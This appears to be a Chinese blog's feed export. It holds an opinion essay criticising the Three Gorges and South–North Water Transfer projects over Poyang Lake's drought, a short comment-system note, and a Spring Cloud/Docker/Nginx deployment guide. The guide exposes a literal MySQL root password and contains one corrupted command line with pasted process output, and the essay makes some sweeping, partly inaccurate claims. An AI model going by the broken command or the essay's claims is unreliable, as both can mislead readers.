鄱阳湖快干枯江西省受不了，为什么？因为中国的抽水工程太厉害了，水泵太厉害了，把长江的水都抽到支流里去了。所以主流水位越往下游水量越少。所以人为自然干涉情况已到了很严重的地步。这种干旱情况未来还会重复出现，而且未来在用水问题上的矛盾还会更尖锐。 南水北调的是中线方案，是指从三峡把水调过去，而不是在丹江口把水调过去。要在三峡把洪水卡住，把三峡的水调到北方去。 长江在历史上流量最小时就有3000多立方/每秒，而黄河平均也就几百立方/每秒，两条河相差很多。长江平均年流量每秒是一万多立方。洪水期流量更大，千年遇的洪水流量大概是九万多立方/每秒，万年一遇的洪水流量是十一万多立方/每秒。如果回到长江的原始状态，其出海口是个湖，湖面宽是20多公里。唐诗中：“帆远影碧空尽，唯见长江天际流”，你会看到那是一条很宽广的河。所以在历史上说长江洪灾很少，而说黄河洪灾的记录就比较多。因为长江下游的蓄水能力很大所以洪水灾害比较小。所以现在长江水位少，而抽水就形成了湖北抽水，湖南就没有多少水可抽，那江西就更受不了，因为水位更低，所以鄱阳湖就像长江的水保住了，因此江西省闹得就特别厉害。 南水北调和三峡里面太多荒唐的东西了，建国以来中国的水利就是在玩水。它根本就不尊重自然规律，想把水折腾到哪儿就折腾到那儿。其实如果中国真的要调水就应该使用地下暗管，就像输油管道一样，埋在地下，又能省地、又没有风险，还能避免人家抢水，能保证进京的水。可是领导人必须让他的功绩让老百姓看得见还得让天上的卫星能够拍得到，比方说隋炀帝修的大运河还留在那儿，南水北调的工程是XXX搞的，三峡工程是XXX的，留在那儿的。 除了领导人，知识分子也是很聪明的，他们是有学习能力的。看看三峡工程中在最后报告上签字的那些专家们，最后都成了工程院和科学院的院士，成了对国家有献的特殊专家和院士，得了这个奖那个奖。你再看那看看那九位没有签名的专家，他们的水平绝对在签了字的人之上，但是没有一个人成为院士。中国的知识份子名利都看得很重，这也不是他们的错。这些还想进入科学最高殿堂的知识份子，他们在三峡工程的学习过程中，知道还是不说的好，说了也没有用。 因为他们的想是步入殿堂，如果他们说了的话，现在很可能连一个科研的题目、科研经费都拿不到。就像黄万里一样，给三峡工程写了那么多的论文，他有一分钱的科研经吗？他从朝廷拿了一分钱的科研经费吗？没有。 所以说，三峡工程在中国的学术界造成了一个很坏的影响，开了一个很坏的先例，后边的人知道了，尽管不是像当初那样被打成右派，可他把你打成另类，没有科经费，那你怎么办！你想当院士，没门。所以他们就不说了。我们一直在玩水的专家学者们，竟忘了一个最浅显的道理：水是从高往低流的，真乃一大黑色幽默。 当一件事，光有赞成而没有批评意见时，这件事错误的可能性很大。当三峡工程和南水北调工程只剩下一位黄万里先生，像唐吉珂德一样批评时，就注定了。 所以，鄱阳湖的现状就是这样， 不建大坝，江西无水可用；建了大坝，毁了白鹤和江豚栖息地。人与自然，在我朝一直就不是可以和谐发展的。 大家都知道这两项伟业贻害万年，谁又敢反对呢？ 民众反对--有个屁用，实在不行给你扣个反贼帽子你试试。地方官员反对--除非你想断送大好前途，呵呵。专学者反对--呵呵，当政者反对--否定前辈路线，自扇耳光。所以，这是一个很现实，也很魔幻的中国特色的伟业。 ~最后，祝伟大祖国繁荣昌盛，千秋万代！</p>
</div>
<p>十年之前，我还在上两江，那时候两江很热闹，现在两江也还开着（这里感谢饿老大，坚守到现在不容易）</p>
<p>在成都的河里湖里随便找找，能看到什么呢，满地食蚊红耳龟福寿螺罗非小龙虾，再找找才能看到点子陵和吸鳅爬鳅之类的，唉</p>
<blockquote class="blockquote-center">
<p>Repair what you can — but when you must fail,fail noisily and as soon as possible.</p>

</blockquote>
<p>不知巴拉水电站能否被拦下马，留给川陕哲罗鲑的时间不多了</p>
<p>十年前，小南海水电站，下马了</p>
<p><span class="exturl" data-url="aHR0cDovL2NxaDJvLmNvbS9mb3J1bS5waHA/bW9kPXZpZXd0aHJlYWQmYW1wO3RpZD0zMzUxMQ==">坚决反对修建小南海水电站<i class="fa fa-external-link-alt"></i></span></p>
<p>也罢</p>
<figure>
<img src="/before-vanish/old.jpg" alt="道子搜山，白鲟遗像" /><figcaption aria-hidden="true">道子搜山，白鲟遗像</figcaption>
</figure>
<blockquote class="blockquote-center">
<p>君不见，高堂明镜悲白发，朝如青丝暮成雪</p>

</blockquote>
]]></content>
      <categories>
        <category>彼黍离离</category>
      </categories>
      <tags>
        <tag>鱼</tag>
      </tags>
  </entry>
  <entry>
    <title>本站评论由valine更换为DisqusJS</title>
    <url>/change-comment-to-disqusjs/</url>
    <content><![CDATA[<p>由于近日不少采用valine作为评论系统网站的遭到几千个垃圾评论刷屏攻击，外加valine存在的安全隐患问题，放弃好看的valine，换用DisqusJS。 utteranc继续使用。</p>
]]></content>
  </entry>
  <entry>
    <title>上线一个Spring Cloud的课程管理服务项目</title>
    <url>/course-managemnet/</url>
    <content><![CDATA[<p>先说一下感想：小作坊不适合微服务，请不起年薪五十万的架构师、年薪三十万的DevOps，没有各种没事造轮子重构刷KPI的目的，没有服务器集群的、开发一只手能数过来的，都谨慎尝试微服务。</p>
<a id="more"></a>
<h2 id="大概情况">大概情况</h2>
<ul>
<li><p>瞎折腾微服务玩，然而并没有集群（手里三台服务器垃圾配置只够乱开几个Docker玩）</p></li>
<li><p>并没有Golang，用的java（别问为什么又是java）</p></li>
<li><p>目测用户量不超过100，很有可能并发量不超过10（对，比我这博客网站还门可罗雀）</p></li>
<li><p>不过比较麻烦的一点是有视频播放的问题，流量根本顶不住，目前是打算买阿里云的视频点播</p></li>
</ul>
<p><del>我感觉到时候日均用户访问量都没有拆分出来的微服务个数多</del></p>
<ul>
<li>用的Spring Cloud全家桶（你看我们像是有闲功夫能自研框架人吗）</li>
<li>写的挺好，一上线幺蛾子就多了</li>
</ul>
<p>cm_admin: 后台管理系统前端代码，vue写的 cm_frontweb: 主页面前端代码，Nuxt.js的 cm_parent: 后端代码 Spring Cloud 拆成了个微服务</p>
<p><del>过度设计，问就是过度设计</del></p>
<figure>
<img src="/course-managemnet/image-20201118214736704.png" alt="后台管理" /><figcaption aria-hidden="true">后台管理</figcaption>
</figure>
<figure>
<img src="/course-managemnet/image-20201118215636817.png" alt="前台界面" /><figcaption aria-hidden="true">前台界面</figcaption>
</figure>
<h2 id="环境配置">环境配置</h2>
<h3 id="数据库">数据库</h3>
<p>docker安装mysql8（其实不是很推荐把数据库扔到Docker里面）</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> docker pull mysql:8.0
<span class="token function">sudo</span> docker images mysql:8.0
<span class="token function">netstat</span> -tunlp
docker run -p <span class="token number">3309</span>:3306 --name mysql8.0 -e <span class="token assign-left variable">MYSQL_ROOT_PASSWORD</span><span class="token operator">=</span><span class="token number">102</span>@uestc -d mysql:8.0
docker <span class="token function">ps</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>初始化数据库，运行</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mycli -u root -h your_ip_address -P <span class="token number">3309</span> -p your_password<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">create database course_management
use course_management
source ~&#x2F;codes&#x2F;course_management&#x2F;course_management.sql<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>看一下是否成功</p>
<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">mysql root@211.83.255.255:course_management&gt; show tables
+-----------------------------+
| Tables_in_course_management |
+-----------------------------+
| crm_banner                  |
| edu_chapter                 |
| edu_comment                 |
| edu_course                  |
| edu_course_collect          |
| edu_course_description      |
| edu_subject                 |
| edu_teacher                 |
| edu_video                   |
| statistics_daily            |
| t_order                     |
| t_pay_log                   |
| ucenter_member              |
+-----------------------------+
13 rows in set
Time: 0.009s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="spring-cloud的8个微服务">Spring Cloud的8个微服务</h3>
<p>分别打包好8个jar包</p>
<p>启动服务：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nohup</span> java -jar <span class="token punctuation">&#123;</span>微服务名.jar<span class="token punctuation">&#125;</span> -Dspring.config.location<span class="token operator">=</span><span class="token punctuation">&#123;</span>配置文件名.properties<span class="token punctuation">&#125;</span> <span class="token operator">></span> java_cm.log <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span> <span class="token operator">&amp;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>配置可以从指定的<code>application.properties</code> 中覆盖</p>
<p>(本来是都扔在Docker里面的，发现docker images有点大，内存消耗也上去了)</p>
<h3 id="修改配置">修改配置</h3>
<p>将<code>src/main/resources/application.properties</code>和<code>src/test/java/CodeGenerator.java</code>中的配置文件（包括数据库端口、密码、密钥等）改成自己的</p>
<p>或者启动的时候在`<code>application.properties</code> 中覆盖</p>
<h3 id="nacos">NACOS</h3>
<p>一个阿里的动态监控监控服务，有一个控制台。我们只要单机版就够了。还有其他的功能，暂时都没用到。</p>
<p>阿里官方的建库脚本</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FsaWJhYmEvbmFjb3MvYmxvYi9tYXN0ZXIvZGlzdHJpYnV0aW9uL2NvbmYvbmFjb3MtbXlzcWwuc3Fs">https://github.com/alibaba/nacos/blob/master/distribution/conf/nacos-mysql.sql<i class="fa fa-external-link-alt"></i></span></p>
<p>或者不要数据库记录日志，直接存成文件。这个直接照着官方的说明启动就行了</p>
<p>见<span class="exturl" data-url="aHR0cHM6Ly9uYWNvcy5pby96aC1jbi9kb2NzL3F1aWNrLXN0YXJ0Lmh0bWw=">https://nacos.io/zh-cn/docs/quick-start.html<i class="fa fa-external-link-alt"></i></span></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/alibaba/nacos.git
<span class="token builtin class-name">cd</span> nacos/
mvn -Prelease-nacos -Dmaven.test.skip<span class="token operator">=</span>true clean <span class="token function">install</span> -U
<span class="token function">ls</span> -al distribution/target/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>不想自己打包的直接下那个release好了</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FsaWJhYmEvbmFjb3MvcmVsZWFzZXM=">https://github.com/alibaba/nacos/releases<i class="fa fa-external-link-alt"></i></span></p>
<p>运行：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> nacos/bin
<span class="token function">sh</span> startup.sh -m standalone<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<figure>
<img src="/course-managemnet/image-20201116215705790.png" alt="这样子就是运行成功了" /><figcaption aria-hidden="true">这样子就是运行成功了</figcaption>
</figure>
<h3 id="nginx">Nginx</h3>
<p>使用Nginx进行端口映射，还是把Nginx扔到Docker里面了</p>
<p>编写<code>default.conf</code>:</p>
<pre class="line-numbers language-nginx" data-language="nginx"><code class="language-nginx"><span class="token keyword">server</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">listen</span>	<span class="token number">9001</span><span class="token punctuation">;</span>
		<span class="token keyword">server_name</span>	localhost<span class="token punctuation">;</span>
		<span class="token keyword">location</span> <span class="token operator">~</span> <span class="token operator">/</span>eduservice<span class="token operator">/</span> <span class="token punctuation">&#123;</span>
			 <span class="token keyword">proxy_pass</span> <span class="token keyword">http</span><span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>localhost<span class="token punctuation">:</span><span class="token number">8001</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">location</span> <span class="token operator">~</span> <span class="token operator">/</span>eduoss<span class="token operator">/</span> <span class="token punctuation">&#123;</span>
			 <span class="token keyword">proxy_pass</span> <span class="token keyword">http</span><span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>localhost<span class="token punctuation">:</span><span class="token number">8002</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">location</span> <span class="token operator">~</span> <span class="token operator">/</span>eduvod<span class="token operator">/</span> <span class="token punctuation">&#123;</span>
			 <span class="token keyword">proxy_pass</span> <span class="token keyword">http</span><span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>localhost<span class="token punctuation">:</span><span class="token number">8003</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
        <span class="token keyword">location</span> <span class="token operator">~</span> <span class="token operator">/</span>educms<span class="token operator">/</span> <span class="token punctuation">&#123;</span>
			 <span class="token keyword">proxy_pass</span> <span class="token keyword">http</span><span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>localhost<span class="token punctuation">:</span><span class="token number">8004</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">location</span> <span class="token operator">~</span> <span class="token operator">/</span>edumsm<span class="token operator">/</span> <span class="token punctuation">&#123;</span>
			 <span class="token keyword">proxy_pass</span> <span class="token keyword">http</span><span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>localhost<span class="token punctuation">:</span><span class="token number">8005</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">location</span> <span class="token operator">~</span> <span class="token operator">/</span>eduucenter<span class="token operator">/</span> <span class="token punctuation">&#123;</span>
			 <span class="token keyword">proxy_pass</span> <span class="token keyword">http</span><span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>localhost<span class="token punctuation">:</span><span class="token number">8006</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">location</span> <span class="token operator">~</span> <span class="token operator">/</span>eduorder<span class="token operator">/</span> <span class="token punctuation">&#123;</span>
			 <span class="token keyword">proxy_pass</span> <span class="token keyword">http</span><span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>localhost<span class="token punctuation">:</span><span class="token number">8007</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">location</span> <span class="token operator">~</span> <span class="token operator">/</span>edustatistics<span class="token operator">/</span> <span class="token punctuation">&#123;</span>
			 <span class="token keyword">proxy_pass</span> <span class="token keyword">http</span><span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>localhost<span class="token punctuation">:</span><span class="token number">8008</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>nginx.conf</p>
<pre class="line-numbers language-nginx" data-language="nginx"><code class="language-nginx"><span class="token keyword">events</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">worker_connections</span>  <span class="token number">4096</span><span class="token punctuation">;</span>  <span class="token comment">## Default: 1024</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">http</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">include</span> <span class="token operator">/</span>etc<span class="token operator">/</span>nginx<span class="token operator">/</span>conf<span class="token punctuation">.</span>d<span class="token operator">/</span><span class="token operator">*</span><span class="token punctuation">.</span>conf<span class="token punctuation">;</span> <span class="token comment">#includes all files of file type.conf</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>编写<code>Dockerfile</code>：</p>
<pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">FROM nginx:alpine
COPY default.conf &#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>构建<code>Docker image</code></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> docker build -t nginxcm <span class="token builtin class-name">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>启动Docker image</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> docker run -d nginxcm<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="其他的问题">其他的问题</h3>
<p>阿里云aliyun-sdk-vod-upload这玩意未开源，需要手动下</p>
<pre class="line-numbers language-none"><code class="language-none">Cannot resolve com.aliyun:aliyun-sdk-vod-upload:1.4.11<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>去<span class="exturl" data-url="aHR0cDovL2RvY3MtYWxpeXVuLmNuLWhhbmd6aG91Lm9zcy5hbGl5dW4taW5jLmNvbS9hc3NldHMvYXR0YWNoLzUxOTkyL2NuX3poLzE2MDA4NDgxOTk5NTIvVk9EVXBsb2FkRGVtby1qYXZhLTEuNC4xMy56aXA/c3BtPWEyYzRnLjExMTg2NjIzLjIuNDAuNDVjMDE5MmJpUEh4Y2omYW1wO2ZpbGU9Vk9EVXBsb2FkRGVtby1qYXZhLTEuNC4xMy56aXA=">这里<i class="fa fa-external-link-alt"></i></span>下载运行</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mvn install:install-file -DgroupId<span class="token operator">=</span>com.aliyun -DartifactId<span class="token operator">=</span>aliyun-sdk-vod-upload -Dversion<span class="token operator">=</span><span class="token number">1.4</span>.11 -Dpackaging<span class="token operator">=</span>jar -Dfile<span class="token operator">=</span>aliyun-java-vod-upload-1.4.13.jar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="前端">前端</h2>
<p>现在很多教程直接<code>npm run dev</code>，好家伙，直接给我看傻了。（CSDN之类的东西实在屏蔽不过来，SEO排名还一个个都贼靠前）</p>
<p>又看了看，貌似静态页面可以直接</p>
<p>然后又看到好多教程，大部分用的<code>pm2</code>运行<code>npm start</code>作为damon，js一统江湖哎，可能都是nodejs全干写的，感觉不太像运维的风格。可我想找nginx的抄作业，扒拉vue的文档拉到最底下才看到一个Docker里跑Nginx的。</p>
<h3 id="后台管理界面">后台管理界面</h3>
<p>先在<code>cm_admin</code>和<code>cm_forntweb</code>两个文件夹下<code>build</code></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> cm_admin
<span class="token function">npm</span> run build<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>然后会在<code>.dist</code>文件夹下生成压缩后的静态页面。</p>
<p>扔到服务器上跑就行了，用Nginx配置一下端口映射和域名（我这域名没有，老板嫌备案麻烦没向学校申请）</p>
<pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">FROM nginx
COPY dist&#x2F; &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html&#x2F;
COPY nginx.conf &#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;default.conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-nginx" data-language="nginx"><code class="language-nginx"><span class="token keyword">server</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">listen</span>       <span class="token number">9528</span><span class="token punctuation">;</span>
    <span class="token keyword">server_name</span>  localhost<span class="token punctuation">;</span>
	<span class="token keyword">server</span> <span class="token number">0.0</span><span class="token number">.0</span><span class="token number">.0</span><span class="token punctuation">;</span>

    <span class="token comment">#charset koi8-r;</span>
    <span class="token keyword">access_log</span>  <span class="token operator">/</span>var<span class="token operator">/</span>log<span class="token operator">/</span>nginx<span class="token operator">/</span>host<span class="token punctuation">.</span>access<span class="token punctuation">.</span>log  main<span class="token punctuation">;</span>
    <span class="token keyword">error_log</span>  <span class="token operator">/</span>var<span class="token operator">/</span>log<span class="token operator">/</span>nginx<span class="token operator">/</span>error<span class="token punctuation">.</span>log  error<span class="token punctuation">;</span>

    <span class="token keyword">location</span> <span class="token operator">/</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">root</span>   <span class="token operator">/</span>usr<span class="token operator">/</span>share<span class="token operator">/</span>nginx<span class="token operator">/</span>html<span class="token punctuation">;</span>
        <span class="token keyword">index</span>  <span class="token keyword">index</span><span class="token punctuation">.</span>html <span class="token keyword">index</span><span class="token punctuation">.</span>htm<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> docker build -t cm_admin <span class="token builtin class-name">.</span>
sodo docker run cm_admin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h3 id="前台界面">前台界面</h3>
<p>Nuxt.js写的，就直接用的<code>nuxt start</code></p>
<p>在<code>packages.json</code>里面指定一下端口和IP</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token property">"config"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
  <span class="token property">"nuxt"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
    <span class="token property">"host"</span><span class="token operator">:</span> <span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span>
    <span class="token property">"port"</span><span class="token operator">:</span> <span class="token string">"3000"</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>测试一下</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> cm_frontweb
<span class="token function">npm</span> run build
<span class="token function">npm</span> run start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<figure>
<img src="/course-managemnet/image-20201122112918925.png" alt="这个内存占用看起来可以接受" /><figcaption aria-hidden="true">这个内存占用看起来可以接受</figcaption>
</figure>
<p>在服务器上</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">npm</span> isntall pm2 -g
<span class="token builtin class-name">cd</span> cm_frontweb
<span class="token function">npm</span> <span class="token function">install</span> --save
nuxt build
pm2 start <span class="token function">npm</span> --name <span class="token string">"cm_frontweb"</span> -- run start
pm2 startup<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<figure>
<img src="/course-managemnet/image-20201122114528875.png" alt="内存占用也还好" /><figcaption aria-hidden="true">内存占用也还好</figcaption>
</figure>
<h2 id="可能的报错">可能的报错</h2>
<pre class="line-numbers language-none"><code class="language-none">npm ERR! code ELIFECYCLE
npm ERR! errno 126
npm ERR! cm_front@1.0.0 dev: &#96;nuxt&#96;
npm ERR! Exit status 126
npm ERR! 
npm ERR! Failed at the cm_front@1.0.0 dev script.
npm ERR! This is probably not a problem with npm. There is likely additional logging output above.

npm ERR! A complete log of this run can be found in:
npm ERR!     &#x2F;root&#x2F;.npm&#x2F;_logs&#x2F;2020-11-16T14_13_24_937Z-debug.log<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>运行</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> cache clean --forceeno1                     14Kb   10Kb   <span class="token number">0.0</span>    <span class="token number">3.4</span>   <span class="token number">6</span>.83G <span class="token number">1</span>.06G  <span class="token number">7152</span> xi102          <span class="token number">1</span>:45 <span class="token number">50</span>    <span class="token number">0</span> S    ? ?    java -server -Xms2g -Xmx2g -Xmn1g -XX:MetaspaceSize<span class="token operator">=</span>128m -XX:MaxMetaspaceSize<span class="token operator">=</span>320m -XX:-OmitStackTraceInFastThrow -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath<span class="token operator">=</span>/home/xi102/course_management/nacos/logs/java_heapdump.hprof -XX:-UseLargePages -Dnacos.member.list<span class="token operator">=</span> -Djava.
<span class="token function">rm</span> -rf node_modules package-lock.json
<span class="token function">npm</span> <span class="token function">install</span>
<span class="token function">npm</span> run dev<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>报错</p>
<pre class="line-numbers language-none"><code class="language-none">Failed to execute goal org.springframework.boot:spring-boot-maven-plugin:2.2.1.RELEASE:repackage (repackage) on project cm_parent: Execution repackage of goal org.springframework.boot:spring-boot-maven-plugin:2.2.1.RELEASE:repackage failed: Plugin org.springframework.boot:spring-boot-maven-plugin:2.2.1.RELEASE or one of its dependencies could not be resolved: Could not transfer artifact org.vafer:jdependency:jar:2.1.1 from&#x2F;to central (https:&#x2F;&#x2F;repo.maven.apache.org&#x2F;maven2): &#x2F;home&#x2F;zjk&#x2F;.m2&#x2F;repository&#x2F;org&#x2F;vafer&#x2F;jdependency&#x2F;2.1.1&#x2F;jdependency-2.1.1.jar.part (没有那个文件或目录) -&gt; [Help 1]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>build报错</p>
<pre class="line-numbers language-none"><code class="language-none">The POM for com.itwny:service_base:jar:0.0.1-SNAPSHOT is missing, no dependency information available<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">Failed to execute goal org.springframework.boot:spring-boot-maven-plugin:2.2.1.RELEASE:repackage (repackage) on project service_base: Execution repackage of goal org.springframework.boot:spring-boot-maven-plugin:2.2.1.RELEASE:repackage failed: Unable to find main class<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>貌似是由于spring-boot-maven-plugin插件打出的包无法被依赖</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sh: /home/zjk/codes/course_management/cm_frontweb/node_modules/.bin/nuxt: Permission denied<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>请用root权限运行。</p>
<pre class="line-numbers language-none"><code class="language-none">2020-11-17 16:02:57 |ERROR |ThreadPoolTaskScheduler-1 |NacosWatch.java:171 |org.springframework.cloud.alibaba.nacos.discovery.NacosWatch |Error watching Nacos Service change<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>检查一下nacos是否正确启动了(不过这个项目不用NACOS也能完成面向客户的功能)</p>
<p>npm run build 报错</p>
<pre class="line-numbers language-none"><code class="language-none">ERROR in Template execution failed: ReferenceError: BASE_URL is not defined<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>修改<code>index.html</code>中<code>BASE_URL</code>为<code>htmlWebpackPlugin.options.url</code></p>
<p>警告可以不用管</p>
<pre class="line-numbers language-none"><code class="language-none">WARNING in asset size limit: The following asset(s) exceed the recommended size limit (244 KiB).<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>nginx报错<code>nginx: [emerg] “server” directive is not allowed here</code></p>
<p>见https://stackoverflow.com/questions/41766195/nginx-emerg-server-directive-is-not-allowed-here</p>
<p>可能是配置没写好</p>
<h2 id="其他">其他</h2>
<p>未完待续</p>
<h2 id="参考">参考</h2>
<p><span class="exturl" data-url="aHR0cHM6Ly9jbGkudnVlanMub3JnL3poL2d1aWRlL2RlcGxveW1lbnQuaHRtbCPpgJrnlKjmjIfljZc=">vue官方文档的部署通用指南<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9zZWdtZW50ZmF1bHQuY29tL2EvMTE5MDAwMDAxMjc3NDY1MA==">next.js nuxt.js等服务端渲染框架构建的项目部署到服务器,并用PM2守护程序<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9zZWdtZW50ZmF1bHQuY29tL2EvMTE5MDAwMDAxMjY3NTAxMg==">vue、react等单页面项目应该这样子部署到服务器<i class="fa fa-external-link-alt"></i></span></p>
<p><a href="https://segmentfault.com/q/1010000008477568"></a></p>
<p>https://juejin.cn/post/6844903666701320205</p>
]]></content>
      <categories>
        <category>102网吧日常</category>
      </categories>
      <tags>
        <tag>Spring Cloud</tag>
        <tag>microservices</tag>
      </tags>
  </entry>
  <entry>
    <title>AUR打包指北</title>
    <url>/create-aur-packages/</url>
    <content><![CDATA[<p>（长期施工中，未完待续） <a id="more"></a></p>
<blockquote class="blockquote-center">
<p>快来当AUR打包工具人/打包苦力吧(笑</p>

</blockquote>
<p>其实还是建议你去先看看官方文档</p>
<h2 id="大致流程">大致流程</h2>
<h3 id="新建一个测试环境">新建一个测试环境</h3>
<p>在本机上直接打包可能会把你自己的机子环境搞乱搞崩，或者忽略了已经在自己电脑上装了了但是没有的依赖，又或者你想... 反正弄一个干净的测试环境是有必要的。可以参考官方Wiki：<span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL0RldmVsb3Blcldpa2k6QnVpbGRpbmdfaW5fYV9jbGVhbl9jaHJvb3Q=">DeveloperWiki:Building in a clean chroot<i class="fa fa-external-link-alt"></i></span>, 或者看肥猫这篇：<span class="exturl" data-url="aHR0cHM6Ly9mZWxpeGMuYXQvMjAxNy8wOC9pbnRyb2R1Y3Rpb24tdG8tYXJjaC1saW51eC1kZXZ0b29scy1idWlsZC1wYWNrYWdlcy1mcm9tLWEtY2xlYW4tY2hyb290Lw==">Arch Linux devtools 简介 – 在干净的环境里编译软件包<i class="fa fa-external-link-alt"></i></span></p>
